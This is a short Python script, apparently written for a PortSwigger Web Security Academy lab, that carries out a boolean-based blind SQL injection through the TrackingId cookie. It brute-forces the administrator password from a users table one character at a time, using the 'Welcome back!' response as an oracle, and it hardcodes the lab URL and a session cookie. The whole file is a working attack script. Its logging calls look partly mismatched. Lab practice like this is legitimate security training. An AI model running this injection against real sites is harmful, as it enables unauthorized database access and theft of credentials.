#!/usr/bin/python3
from pwn import *
import requests, signal, time, pdb, sys, string

CHARACTER_DICTIONARY = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20
MAIN_URL = "https://0a4a000c03f7bf7ec726a769007b00fc.web-security-academy.net"
SESSION_COOKIE = "rJHRic4uZUQ8dTgcLVo8VdT2NRNoSXWG"


def def_handler(sig, frame):
    logger.error("Aborted! (CTRL + C)")
    sys.exit(1)

#Ctrl +c
signal.signal(signal.SIGINT, def_handler)


def make_request():
    password = ""
    progress_log = logger.level("Brute Force", no=15)

    with progress_log as progress:
        progress.info("Beginning brute force attack!")
        time.sleep(2)
        pw_log = logger.level("Password", no=16)

        for i in range(1, PASSWORD_LENGTH + 1):
            for c in CHARACTER_DICTIONARY:
                cookies = {
                   'TrackingId':"bmozrmQF1DPtyt5z'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), %d, 1)='%s" %(i, c),
                    "session": SESSION_COOKIE,
                }

                progress.status(f"{cookies['TrackingId']}")

                r = requests.get(MAIN_URL, cookies=cookies)

                if "Welcome back!" in r.text:
                    password += c
                    pw_log.status(password)
                    break


if __name__ == "__main__":
    make_request()
